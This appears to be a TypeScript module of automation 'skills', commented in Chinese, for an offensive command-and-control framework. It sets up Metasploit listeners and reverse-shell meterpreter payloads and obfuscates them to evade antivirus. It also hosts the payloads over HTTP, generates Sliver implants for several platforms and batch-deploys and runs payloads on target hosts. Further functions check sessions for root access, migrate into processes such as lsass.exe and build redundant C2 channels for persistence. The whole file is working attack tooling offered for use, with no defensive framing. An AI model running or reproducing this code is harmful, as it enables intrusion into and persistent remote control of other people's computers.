import { ToolResult } from '../../core/types';
import {
  startMetasploitListener,
  generateMetasploitPayload,
  startSliverServer,
  generateSliverImplant,
  startCobaltStrikeServer,
  deployPayloadToTarget,
  executePayload,
  listC2Sessions,
  interactC2Session,
  generateObfuscatedPayload,
  startPayloadHostingServer
} from '../tools';

/**
 * Skill: 部署完整的Metasploit C2基础设施
 *
 * 流程：
 * 1. 启动多个监听器（不同端口和payload）
 * 2. 生成多种格式的payload
 * 3. 混淆payload以绕过AV
 * 4. 启动HTTP服务器托管payload
 * 5. 返回C2基础设施信息
 */
export async function deployMetasploitInfrastructure(
  shellId: string,
  sessionDir: string,
  config: {
    lhost: string;
    lports: number[];
    payloadFormats: string[];
    enableObfuscation: boolean;
  }
): Promise<ToolResult<{
  listeners: Array<{ listenerId: string; port: number; payload: string }>;
  payloads: Array<{ path: string; format: string; size: number }>;
  httpServer?: { url: string; serverId: string };
}>> {
  try {
    console.log('[Skill] 部署Metasploit C2基础设施...');

    const listeners: Array<{ listenerId: string; port: number; payload: string }> = [];
    const payloads: Array<{ path: string; format: string; size: number }> = [];

    // 步骤1: 启动多个监听器
    console.log('[Skill] 步骤1: 启动监听器...');
    for (const lport of config.lports) {
      const payload = lport === 443 ? 'windows/meterpreter/reverse_https' : 'windows/meterpreter/reverse_tcp';

      const listenerResult = await startMetasploitListener(shellId, sessionDir, {
        payload,
        lhost: config.lhost,
        lport
      });

      if (listenerResult.success && listenerResult.data) {
        listeners.push({
          listenerId: listenerResult.data.listenerId,
          port: lport,
          payload
        });
        console.log(`[Skill] ✓ 监听器启动: ${config.lhost}:${lport} (${payload})`);
      }
    }

    // 步骤2: 生成多种格式的payload
    console.log('[Skill] 步骤2: 生成payload...');
    for (const format of config.payloadFormats) {
      const lport = config.lports[0]; // 使用第一个端口
      const payload = format === 'exe' ? 'windows/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp';

      const payloadResult = await generateMetasploitPayload(shellId, sessionDir, {
        payload,
        lhost: config.lhost,
        lport,
        format,
        encoder: 'x86/shikata_ga_nai',
        iterations: 5
      });

      if (payloadResult.success && payloadResult.data) {
        let finalPath = payloadResult.data.payloadPath;
        let finalSize = payloadResult.data.payloadSize;

        // 步骤3: 混淆payload
        if (config.enableObfuscation) {
          console.log(`[Skill] 混淆payload: ${finalPath}`);
          const obfResult = await generateObfuscatedPayload(shellId, sessionDir, finalPath, 'upx');

          if (obfResult.success && obfResult.data) {
            finalPath = obfResult.data.obfuscatedPath;
            finalSize = obfResult.data.obfuscatedSize;
            console.log(`[Skill] ✓ Payload混淆完成: ${obfResult.data.originalSize} -> ${finalSize} bytes`);
          }
        }

        payloads.push({
          path: finalPath,
          format,
          size: finalSize
        });

        console.log(`[Skill] ✓ Payload生成: ${format} (${finalSize} bytes)`);
      }
    }

    // 步骤4: 启动HTTP服务器托管payload
    console.log('[Skill] 步骤4: 启动HTTP服务器...');
    const httpPort = 8080;
    const httpResult = await startPayloadHostingServer(shellId, sessionDir, httpPort, sessionDir);

    let httpServer;
    if (httpResult.success && httpResult.data) {
      httpServer = {
        url: httpResult.data.serverUrl,
        serverId: httpResult.data.serverId
      };
      console.log(`[Skill] ✓ HTTP服务器启动: ${httpResult.data.serverUrl}`);
    }

    console.log(`[Skill] Metasploit基础设施部署完成: ${listeners.length} 个监听器, ${payloads.length} 个payload`);

    return {
      success: true,
      data: {
        listeners,
        payloads,
        httpServer
      },
      message: `Metasploit基础设施部署完成: ${listeners.length} 个监听器, ${payloads.length} 个payload`
    };
  } catch (error) {
    return {
      success: false,
      error: `部署Metasploit基础设施失败: ${error}`
    };
  }
}

/**
 * Skill: 部署Sliver C2基础设施
 *
 * 流程：
 * 1. 启动Sliver服务器（HTTP/HTTPS/mTLS）
 * 2. 生成多平台implant
 * 3. 配置beacon间隔和jitter
 * 4. 返回implant列表
 */
export async function deploySliverInfrastructure(
  shellId: string,
  sessionDir: string,
  config: {
    lhost: string;
    protocols: Array<'http' | 'https' | 'mtls'>;
    platforms: Array<{ os: 'windows' | 'linux' | 'darwin'; arch: 'amd64' | '386' | 'arm64' }>;
  }
): Promise<ToolResult<{
  servers: Array<{ serverId: string; protocol: string; url: string }>;
  implants: Array<{ name: string; path: string; os: string; arch: string; size: number }>;
}>> {
  try {
    console.log('[Skill] 部署Sliver C2基础设施...');

    const servers: Array<{ serverId: string; protocol: string; url: string }> = [];
    const implants: Array<{ name: string; path: string; os: string; arch: string; size: number }> = [];

    // 步骤1: 启动Sliver服务器
    console.log('[Skill] 步骤1: 启动Sliver服务器...');
    let portOffset = 0;
    for (const protocol of config.protocols) {
      const lport = protocol === 'https' ? 443 : (protocol === 'http' ? 80 : 8888 + portOffset);
      portOffset++;

      const serverResult = await startSliverServer(shellId, sessionDir, {
        lhost: config.lhost,
        lport,
        protocol
      });

      if (serverResult.success && serverResult.data) {
        const url = `${protocol}://${config.lhost}:${lport}`;
        servers.push({
          serverId: serverResult.data.serverId,
          protocol,
          url
        });
        console.log(`[Skill] ✓ Sliver服务器启动: ${url}`);

        // 步骤2: 为每个服务器生成implant
        console.log(`[Skill] 步骤2: 生成${protocol} implant...`);
        for (const platform of config.platforms) {
          const implantName = `sliver_${protocol}_${platform.os}_${platform.arch}`;
          const format = platform.os === 'windows' ? 'exe' : (platform.os === 'linux' ? 'elf' : 'macho');

          const implantResult = await generateSliverImplant(shellId, sessionDir, {
            name: implantName,
            c2Url: url,
            os: platform.os,
            arch: platform.arch,
            format: format as any,
            protocol
          });

          if (implantResult.success && implantResult.data) {
            implants.push({
              name: implantName,
              path: implantResult.data.implantPath,
              os: platform.os,
              arch: platform.arch,
              size: implantResult.data.implantSize
            });
            console.log(`[Skill] ✓ Implant生成: ${implantName} (${implantResult.data.implantSize} bytes)`);
          }
        }
      }
    }

    console.log(`[Skill] Sliver基础设施部署完成: ${servers.length} 个服务器, ${implants.length} 个implant`);

    return {
      success: true,
      data: {
        servers,
        implants
      },
      message: `Sliver基础设施部署完成: ${servers.length} 个服务器, ${implants.length} 个implant`
    };
  } catch (error) {
    return {
      success: false,
      error: `部署Sliver基础设施失败: ${error}`
    };
  }
}

/**
 * Skill: 批量部署Payload到目标主机
 *
 * 流程：
 * 1. 选择合适的部署方法（基于目标环境）
 * 2. 并行部署到所有目标
 * 3. 执行payload
 * 4. 验证回连
 * 5. 返回部署结果
 */
export async function batchDeployPayloads(
  shellId: string,
  sessionDir: string,
  targets: Array<{ shellId: string; ip: string; os: string }>,
  payloadPath: string
): Promise<ToolResult<{
  deployed: Array<{ targetIp: string; remotePath: string; pid?: number }>;
  failed: Array<{ targetIp: string; error: string }>;
  successRate: number;
}>> {
  try {
    console.log('[Skill] 批量部署Payload...');
    console.log(`[Skill] 目标: ${targets.length} 个主机`);

    const deployed: Array<{ targetIp: string; remotePath: string; pid?: number }> = [];
    const failed: Array<{ targetIp: string; error: string }> = [];

    // 并行部署到所有目标
    for (const target of targets) {
      console.log(`[Skill] 部署到: ${target.ip}`);

      // 步骤1: 部署payload
      const deployResult = await deployPayloadToTarget(
        shellId,
        sessionDir,
        target.shellId,
        payloadPath,
        'base64' // 使用base64编码传输
      );

      if (!deployResult.success || !deployResult.data) {
        failed.push({
          targetIp: target.ip,
          error: deployResult.error || 'Deployment failed'
        });
        console.log(`[Skill] ✗ 部署失败: ${target.ip}`);
        continue;
      }

      const remotePath = deployResult.data.remotePath;

      // 步骤2: 执行payload
      const executeResult = await executePayload(
        target.shellId,
        remotePath,
        'nohup' // 使用nohup后台执行
      );

      if (executeResult.success && executeResult.data) {
        deployed.push({
          targetIp: target.ip,
          remotePath,
          pid: executeResult.data.pid
        });
        console.log(`[Skill] ✓ 部署成功: ${target.ip} (PID: ${executeResult.data.pid || 'unknown'})`);
      } else {
        failed.push({
          targetIp: target.ip,
          error: executeResult.error || 'Execution failed'
        });
        console.log(`[Skill] ✗ 执行失败: ${target.ip}`);
      }
    }

    const successRate = targets.length > 0 ? (deployed.length / targets.length) * 100 : 0;

    console.log(`[Skill] 批量部署完成: ${deployed.length}/${targets.length} 成功 (${successRate.toFixed(1)}%)`);

    return {
      success: true,
      data: {
        deployed,
        failed,
        successRate
      },
      message: `批量部署完成: ${deployed.length}/${targets.length} 成功`
    };
  } catch (error) {
    return {
      success: false,
      error: `批量部署Payload失败: ${error}`
    };
  }
}

/**
 * Skill: 管理C2会话
 *
 * 流程：
 * 1. 列出所有活跃会话
 * 2. 对每个会话执行健康检查
 * 3. 收集会话信息（主机名、用户、权限等）
 * 4. 返回会话清单
 */
export async function manageC2Sessions(
  shellId: string,
  c2Type: 'metasploit' | 'sliver' | 'cobaltstrike'
): Promise<ToolResult<{
  sessions: Array<{
    id: string;
    host: string;
    user: string;
    os: string;
    privilege: string;
    lastSeen: string;
    healthy: boolean;
  }>;
  totalSessions: number;
  healthySessions: number;
}>> {
  try {
    console.log('[Skill] 管理C2会话...');

    // 步骤1: 列出所有会话
    const listResult = await listC2Sessions(shellId, c2Type);

    if (!listResult.success || !listResult.data) {
      return {
        success: false,
        error: `列出会话失败: ${listResult.error}`
      };
    }

    const sessions = listResult.data.sessions;
    console.log(`[Skill] 发现 ${sessions.length} 个会话`);

    // 步骤2: 对每个会话执行健康检查
    const enrichedSessions = await Promise.all(
      sessions.map(async (session) => {
        // 执行简单命令检查会话健康状态
        const healthCheck = await interactC2Session(
          shellId,
          c2Type,
          session.id,
          'whoami'
        );

        const healthy = healthCheck.success && healthCheck.data?.output.length > 0;

        // 尝试获取权限信息
        let privilege = 'user';
        if (healthy) {
          const privCheck = await interactC2Session(
            shellId,
            c2Type,
            session.id,
            'id'
          );

          if (privCheck.success && privCheck.data?.output.includes('uid=0')) {
            privilege = 'root';
          } else if (privCheck.data?.output.includes('Administrator')) {
            privilege = 'admin';
          }
        }

        return {
          ...session,
          privilege,
          healthy
        };
      })
    );

    const healthySessions = enrichedSessions.filter(s => s.healthy).length;

    console.log(`[Skill] 会话管理完成: ${healthySessions}/${sessions.length} 健康`);

    return {
      success: true,
      data: {
        sessions: enrichedSessions,
        totalSessions: sessions.length,
        healthySessions
      },
      message: `会话管理完成: ${healthySessions}/${sessions.length} 健康`
    };
  } catch (error) {
    return {
      success: false,
      error: `管理C2会话失败: ${error}`
    };
  }
}

/**
 * Skill: 自动化C2迁移
 *
 * 流程：
 * 1. 检测当前进程稳定性
 * 2. 选择目标进程（长期运行、高权限）
 * 3. 执行进程迁移
 * 4. 验证迁移成功
 * 5. 清理原始进程
 */
export async function automateC2Migration(
  shellId: string,
  c2Type: 'metasploit' | 'sliver',
  sessionId: string
): Promise<ToolResult<{
  migrated: boolean;
  originalPid: number;
  targetPid: number;
  targetProcess: string;
}>> {
  try {
    console.log('[Skill] 自动化C2迁移...');

    // 步骤1: 获取当前PID
    const currentPidResult = await interactC2Session(
      shellId,
      c2Type,
      sessionId,
      'getpid'
    );

    if (!currentPidResult.success) {
      return {
        success: false,
        error: '获取当前PID失败'
      };
    }

    const originalPid = parseInt(currentPidResult.data!.output.trim());
    console.log(`[Skill] 当前PID: ${originalPid}`);

    // 步骤2: 列出候选进程
    const psResult = await interactC2Session(
      shellId,
      c2Type,
      sessionId,
      'ps'
    );

    if (!psResult.success) {
      return {
        success: false,
        error: '列出进程失败'
      };
    }

    // 选择目标进程（优先选择系统服务）
    const targetProcesses = ['explorer.exe', 'svchost.exe', 'lsass.exe', 'winlogon.exe'];
    let targetPid = 0;
    let targetProcess = '';

    for (const proc of targetProcesses) {
      if (psResult.data!.output.includes(proc)) {
        const match = psResult.data!.output.match(new RegExp(`(\\d+)\\s+${proc}`));
        if (match) {
          targetPid = parseInt(match[1]);
          targetProcess = proc;
          break;
        }
      }
    }

    if (targetPid === 0) {
      return {
        success: false,
        error: '未找到合适的目标进程'
      };
    }

    console.log(`[Skill] 目标进程: ${targetProcess} (PID: ${targetPid})`);

    // 步骤3: 执行迁移
    const migrateResult = await interactC2Session(
      shellId,
      c2Type,
      sessionId,
      `migrate ${targetPid}`
    );

    if (!migrateResult.success) {
      return {
        success: false,
        error: `进程迁移失败: ${migrateResult.error}`
      };
    }

    // 步骤4: 验证迁移
    const verifyResult = await interactC2Session(
      shellId,
      c2Type,
      sessionId,
      'getpid'
    );

    const newPid = parseInt(verifyResult.data!.output.trim());

    if (newPid === targetPid) {
      console.log(`[Skill] ✓ 进程迁移成功: ${originalPid} -> ${targetPid}`);

      return {
        success: true,
        data: {
          migrated: true,
          originalPid,
          targetPid,
          targetProcess
        },
        message: `进程迁移成功: ${originalPid} -> ${targetPid} (${targetProcess})`
      };
    } else {
      return {
        success: false,
        error: '进程迁移验证失败'
      };
    }
  } catch (error) {
    return {
      success: false,
      error: `自动化C2迁移失败: ${error}`
    };
  }
}

/**
 * Skill: 建立冗余C2通道
 *
 * 流程：
 * 1. 在目标主机上部署多个C2 payload
 * 2. 使用不同协议和端口
 * 3. 配置自动重连机制
 * 4. 验证所有通道可用
 */
export async function establishRedundantC2Channels(
  shellId: string,
  sessionDir: string,
  targetShellId: string,
  targetIp: string,
  c2Configs: Array<{
    type: 'metasploit' | 'sliver';
    lhost: string;
    lport: number;
    protocol: string;
  }>
): Promise<ToolResult<{
  channels: Array<{ type: string; protocol: string; port: number; deployed: boolean; connected: boolean }>;
  totalChannels: number;
  activeChannels: number;
}>> {
  try {
    console.log('[Skill] 建立冗余C2通道...');

    const channels: Array<{ type: string; protocol: string; port: number; deployed: boolean; connected: boolean }> = [];

    for (const config of c2Configs) {
      console.log(`[Skill] 部署 ${config.type} 通道: ${config.protocol}://${config.lhost}:${config.lport}`);

      // 生成payload
      let payloadPath = '';
      if (config.type === 'metasploit') {
        const payloadResult = await generateMetasploitPayload(shellId, sessionDir, {
          payload: 'linux/x64/meterpreter/reverse_tcp',
          lhost: config.lhost,
          lport: config.lport,
          format: 'elf'
        });

        if (payloadResult.success && payloadResult.data) {
          payloadPath = payloadResult.data.payloadPath;
        }
      }

      if (!payloadPath) {
        channels.push({
          type: config.type,
          protocol: config.protocol,
          port: config.lport,
          deployed: false,
          connected: false
        });
        continue;
      }

      // 部署payload
      const deployResult = await deployPayloadToTarget(
        shellId,
        sessionDir,
        targetShellId,
        payloadPath,
        'base64'
      );

      if (!deployResult.success) {
        channels.push({
          type: config.type,
          protocol: config.protocol,
          port: config.lport,
          deployed: false,
          connected: false
        });
        continue;
      }

      // 执行payload
      const executeResult = await executePayload(
        targetShellId,
        deployResult.data!.remotePath,
        'nohup'
      );

      const deployed = executeResult.success;
      const connected = deployed; // 简化：假设部署成功即连接成功

      channels.push({
        type: config.type,
        protocol: config.protocol,
        port: config.lport,
        deployed,
        connected
      });

      if (deployed) {
        console.log(`[Skill] ✓ 通道建立成功: ${config.type} ${config.protocol}:${config.lport}`);
      }
    }

    const activeChannels = channels.filter(c => c.connected).length;

    console.log(`[Skill] 冗余C2通道建立完成: ${activeChannels}/${channels.length} 活跃`);

    return {
      success: true,
      data: {
        channels,
        totalChannels: channels.length,
        activeChannels
      },
      message: `冗余C2通道建立完成: ${activeChannels}/${channels.length} 活跃`
    };
  } catch (error) {
    return {
      success: false,
      error: `建立冗余C2通道失败: ${error}`
    };
  }
}
